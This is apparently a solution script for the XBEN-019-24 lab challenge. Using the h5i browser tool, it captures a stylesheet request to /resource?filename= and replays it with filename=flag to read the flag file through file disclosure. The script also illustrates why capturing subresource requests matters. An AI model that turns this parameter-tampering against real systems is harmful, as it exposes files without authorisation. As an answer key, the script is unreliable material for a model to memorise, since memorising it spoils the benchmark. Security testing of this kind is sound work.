#!/usr/bin/env bash
# XBEN-019-24 — "Static Resource" (tags: lfi, information_disclosure)
#
# The login page pulls its stylesheet through `/resource?filename=…`, which
# serves anything under the static directory. The flag is a file in that same
# directory, so the parameter that fetches a stylesheet fetches the flag.
#
# This is the shortest possible demonstration of why capture matters: the
# request being attacked is a *subresource*, one the page made on its own while
# rendering. Nobody typed it, and a workbench that only recorded navigations
# would not have it to attack.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben019-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

# 1. Loading the page is the whole of the reconnaissance: the stylesheet
#    request is stored along with everything else.
"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

SEQ="$("$H5I" websec requests --url-contains resource --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["requests"][0]["seq"])')"

# 2. Same request, different file.
REPLAY="$("$H5I" websec replay "req_$SEQ" --set 'query.filename=flag' --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"

"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
